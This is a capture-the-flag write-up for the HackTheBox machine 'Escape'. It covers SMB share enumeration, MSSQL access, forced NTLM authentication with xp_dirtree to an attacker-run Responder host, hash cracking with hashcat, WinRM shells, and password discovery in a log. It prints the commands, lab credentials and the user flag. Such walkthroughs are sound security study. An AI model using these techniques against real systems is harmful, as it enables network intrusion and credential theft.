---
title: Escape
draft: false
tags:
  - medium
  - windows
  - smb
  - mssqlServer
---

# Description
Escape is a Medium difficulty Windows Active Directory machine that starts with an SMB share that guest authenticated users can download a sensitive PDF file. Inside the PDF file temporary credentials are available for accessing an MSSQL service running on the machine. An attacker is able to force the MSSQL service to authenticate to his machine and capture the hash. It turns out that the service is running under a user account and the hash is crackable. Having a valid set of credentials an attacker is able to get command execution on the machine using WinRM. Enumerating the machine, a log file reveals the credentials for the user `ryan.cooper`. Further enumeration of the machine, reveals that a Certificate Authority is present and one certificate template is vulnerable to the ESC1 attack, meaning that users who are legible to use this template can request certificates for any other user on the domain including Domain Administrators. Thus, by exploiting the ESC1 vulnerability, an attacker is able to obtain a valid certificate for the Administrator account and then use it to get the hash of the administrator user.
# Recon
## nmap
```
└─$ nmap -Pn -T4 -sV -A 10.129.228.253            
Starting Nmap 7.92 ( https://nmap.org ) at 2025-03-30 11:21 EDT
Nmap scan report for 10.129.228.253 (10.129.228.253)
Host is up (0.036s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
53/tcp   open  tcpwrapped
88/tcp   open  tcpwrapped
135/tcp  open  tcpwrapped
139/tcp  open  tcpwrapped
389/tcp  open  tcpwrapped
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2025-03-30T23:22:13+00:00; +7h59m59s from scanner time.
445/tcp  open  tcpwrapped
464/tcp  open  tcpwrapped
593/tcp  open  tcpwrapped
636/tcp  open  tcpwrapped
|_ssl-date: 2025-03-30T23:22:13+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
1433/tcp open  tcpwrapped
3268/tcp open  tcpwrapped
3269/tcp open  tcpwrapped
|_ssl-date: 2025-03-30T23:22:13+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.45 seconds

```
### Enum SMB
```
└─$ echo exit | smbclient -L 10.129.228.253
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Public          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.228.253 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
- Access to folder share of smb server: /Public without password. See the file `SQL Server Procedure.pdf`
```
└─$ smbclient //10.129.228.253/Public        
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Nov 19 06:51:25 2022
  ..                                  D        0  Sat Nov 19 06:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022

                5184255 blocks of size 4096. 1467125 blocks available
smb: \> 

```
- Get `SQL Server Procedure.pdf` to my pc
```
└─$ smbclient //10.129.228.253/Public        
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Nov 19 06:51:25 2022
  ..                                  D        0  Sat Nov 19 06:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022

                5184255 blocks of size 4096. 1467125 blocks available
smb: \> get 'SQL Server Procedures.pdf'
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \'SQL
smb: \> get "SQL Server Procedures.pdf"
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (66.4 KiloBytes/sec) (average 66.4 KiloBytes/sec)
smb: \> 

```
- Content of this file:
![[Pasted image 20250330224536.png]]
- I see  guilde access MSSQL server for non join domain machine:
![[Pasted image 20250330225628.png]]
- and leak info acc : PublicUser
![[Pasted image 20250330232017.png]]
## MSSQL Server
- Connect to MSSQL Server with PublicUser
![[Pasted image 20250330232332.png]]
![[Pasted image 20250330232438.png]]
- When i access in SSQL Server with UserPublic . I try discovery permission . User just have public permission (low permission). Not run xp_shell
![[Pasted image 20250330234123.png]]
- I need have name of user instance. I use a trick to get it. "SMB Capture Attack through MSSQL" when i check user have permission:![[Pasted image 20250330234649.png]]
# Attack SMB Capture through MSSQL
- I use the responder tool to intercept connect SMB Capture Attack through MSSQL:
```c
sudo responder -I tun0
 .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.1.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]
```
- Run query connect to SMB attacker server `EXEC xp_dirtree '\\10.10.14.4\share';` The attacker will get connect of MSSQL Server: 
```c
[+] Listening for events...                                                                                                                                                                  

/usr/share/responder/./Responder.py:366: DeprecationWarning: setDaemon() is deprecated, set the daemon attribute instead
  thread.setDaemon(True)
/usr/share/responder/./Responder.py:256: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  server.socket = ssl.wrap_socket(server.socket, certfile=cert, keyfile=key, server_side=True)
[SMB] NTLMv2-SSP Client   : ::ffff:10.129.228.253
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:1f8dc54794cbe92d:B4BDEC29991F76DB8DE46A98083586B0:010100000000000000041FE66DA6DB01F25942A569584974000000000200080045004F003400460001001E00570049004E002D005400510030004200440054003700560057003000330004003400570049004E002D00540051003000420044005400370056005700300033002E0045004F00340046002E004C004F00430041004C000300140045004F00340046002E004C004F00430041004C000500140045004F00340046002E004C004F00430041004C000700080000041FE66DA6DB0106000400020000000800300030000000000000000000000000300000E265DC34360C32BBA6CEBD17A5DACB1B85D3D61957553BF3CBD8E5E3FEAB09EF0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0034000000000000000000 
```
-> The username of victim's MSSQL is: **sql_svc** and NTLLMv2-SSP hash have format: ``Username::Domain:Challenge:NTProofStr:Blob``
> 📌 Tổng quan về NTLM và NTLMv2
NTLM (NT LAN Manager) là một giao thức xác thực cũ của Microsoft. NTLMv2 là phiên bản cải tiến, an toàn hơn so với NTLMv1.
Trong NTLMv2, quy trình xác thực diễn ra như sau:
1 **Client yêu cầu kết nối đến một dịch vụ (file share, web, SMB, v.v.)**.  
2 *Server (hoặc máy bị tấn công giả mạo server)** gửi về một **challenge (nonce)**
3 Client phản hồi lại bằng username + domain + hash của mật khẩu dựa trên challenge** → đây chính là cái được gọi là **NTLMv2-SSP hash** (hay **NTLMv2 response**).
- I use hashcat to crack NTLMv2-SSP hash:
```c
hashcat -m 5600 -a 0  ntlmv2_hash  /home/kali/Desktop/wordlist/rockyou.txt
Hardware.Mon.#1..: Util: 31%

SQL_SVC::sequel:1f8dc54794cbe92d:b4bdec29991f76db8de46a98083586b0:010100000000000000041fe66da6db01f25942a569584974000000000200080045004f003400460001001e00570049004e002d005400510030004200440054003700560057003000330004003400570049004e002d00540051003000420044005400370056005700300033002e0045004f00340046002e004c004f00430041004c000300140045004f00340046002e004c004f00430041004c000500140045004f00340046002e004c004f00430041004c000700080000041fe66da6db0106000400020000000800300030000000000000000000000000300000e265dc34360c32bba6cebd17a5dacb1b85d3d61957553bf3cbd8e5e3feab09ef0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0034000000000000000000:REGGIE1234ronnie
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: SQL_SVC::sequel:1f8dc54794cbe92d:b4bdec29991f76db8d...000000
Time.Started.....: Sat Apr  5 21:31:17 2025 (20 secs)
Time.Estimated...: Sat Apr  5 21:31:37 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/home/kali/Desktop/wordlist/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   493.2 kH/s (0.60ms) @ Accel:256 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10700800/14344384 (74.60%)
Rejected.........: 0/10700800 (0.00%)
Restore.Point....: 10699776/14344384 (74.59%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: REJOICERAP -> REDOBLANTE_123
Hardware.Mon.#1..: Util: 54%

Started: Sat Apr  5 21:30:44 2025
Stopped: Sat Apr  5 21:31:38 2025
```
-> It cracks the password : **REGGIE1234ronnie**. Have account then use evil-winrm tool to remote connect to Victim machine : 
# Get Flag 1
```c
└─$ evil-winrm -i 10.129.228.253 -u sql_srv -p REGGIE1234ronnie

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1

                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Desktop/HTB/Escape]
└─$ evil-winrm -i 10.129.228.253 -u sql_svc -p REGGIE1234ronnie

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\sql_svc\Documents> ls
```
- Now i going to recon priv of user:
```powershell
*Evil-WinRM* PS C:\Users\sql_svc\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

*Evil-WinRM* PS C:\Users\sql_svc\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


*Evil-WinRM* PS C:\Users\sql_svc\Documents> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
The command completed successfully.

*Evil-WinRM* PS C:\Users> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Brandon.Brown            Guest
James.Roberts            krbtgt                   Nicole.Thompson
Ryan.Cooper              sql_svc                  Tom.Henn
The command completed with one or more errors.

```
-> The user have not priv Administators, but it have `SeMachineAccountPrivilege` (this is it have permission create a computer account in AD) and the machine have permission id Admin, domain admin, Enterprise Admins. And RyanCooper user have Administrator permission.
- The root folder have Public and SQLServer unusual. The Public just have SQL Server Procedures.pdf
- The SQLServer folder: 
```
*Evil-WinRM* PS C:\SQLServer> ls


    Directory: C:\SQLServer


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/7/2023   8:06 AM                Logs
d-----       11/18/2022   1:37 PM                SQLEXPR_2019
-a----       11/18/2022   1:35 PM        6379936 sqlexpress.exe
-a----       11/18/2022   1:36 PM      268090448 SQLEXPR_x64_ENU.exe

```
- Discovery this folder: in Logs have ERROR.BAK
```
*Evil-WinRM* PS C:\SQLServer\Logs> ls


    Directory: C:\SQLServer\Logs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK
```
- download this file 
```
*Evil-WinRM* PS C:\Users\sql_svc\Documents> download C:\SQLServer\Logs\ERRORLOG.BAK
Info: Downloading C:\SQLServer\Logs\ERRORLOG.BAK to ./C:\SQLServer\Logs\ERRORLOG.BAK

                                                             
Info: Download successful!

```
- See content of the file:
```
2022-11-18 13:43:07.44 spid51      Changed database context to 'master'.
2022-11-18 13:43:07.44 spid51      Changed language setting to us_english.
2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.72 spid51      Attempting to load library 'xpstar.dll' into memory. This is an informational message only. No user action is required.
2022-11-18 13:43:07.76 spid51      Using 'xpstar.dll' version '2019.150.2000' to execute extended stored procedure 'xp_sqlagent_is_starting'. This is an informational message only; no user action is required.

```
- We attention !! It looks like the Ryan.Cooper potentially mistyped password. Then user have name 'NuclearMosquito3' -> **This is interesting** -> I guess the user copy pastes the password in the username form :)) -> Try login with account Ryan.Cooper with password: NuclearMosquito3
```
└─$ evil-winrm -i 10.129.228.253 -u Ryan.Cooper -p NuclearMosquito3                       

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> whoami
sequel\ryan.cooper
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> 

```
-> Nice :))). I get the first flag:
```
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> cat user.txt
ae1d0ffe5fc3c470ccf0891cd7829b42

```
# Highlights
- SMB attack: smbclient
- SMB attack through MSSQL Server: xp_dirtree, responder tool
- Windows attack : evil-winrm tool